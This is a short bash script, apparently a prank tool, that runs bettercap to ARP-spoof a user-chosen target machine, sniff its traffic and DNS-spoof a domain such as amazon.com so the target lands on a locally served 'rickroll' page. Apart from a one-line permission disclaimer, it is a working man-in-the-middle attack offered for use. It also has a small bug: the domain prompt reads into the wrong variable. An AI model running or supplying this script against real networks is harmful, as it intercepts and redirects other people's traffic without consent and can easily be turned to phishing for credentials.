#!/bin/bash
# rickroll script :)
# ONLY USE THIS ON NETWORKS YOU OWN OR HAVE PERMISSION TO PERFORM ARP SPOOFING ON
# enjoy

IP_ADDR=$(ifconfig -a | grep inet | awk 'NR == 3 { print $2 }')
BETTERCAP=$(whereis bettercap | awk '{ print $2 }')
PYTHON3=$(whereis python3 | awk '{ print $2 }')

# checking if dependencies are installed
if [[ -x $BETTERCAP ]]; then
    echo "Bettercap exists."
else
    echo "Bettercap not found."
fi

if [[ -x $PYTHON3 ]]; then
    echo "Python3 exists."
else
    echo "Python3 not found."
fi

echo "Enter the IP address of your target: "
read TARGET_IP
echo "Enter the domain name you would like to spoof (e.g amazon.com): "
read $DOMAIN_NAME

nohup sudo python3 -m http.server -d rickroll-website 80 &

# the real thang
sudo bettercap -eval "net.probe on; set arp.spoof.targets $TARGET_IP; set net.sniff.local true; arp.spoof on; net.sniff on; set dns.spoof.domains $DOMAIN_NAME; set dns.spoof.address $IP_ADDR; dns.spoof on"


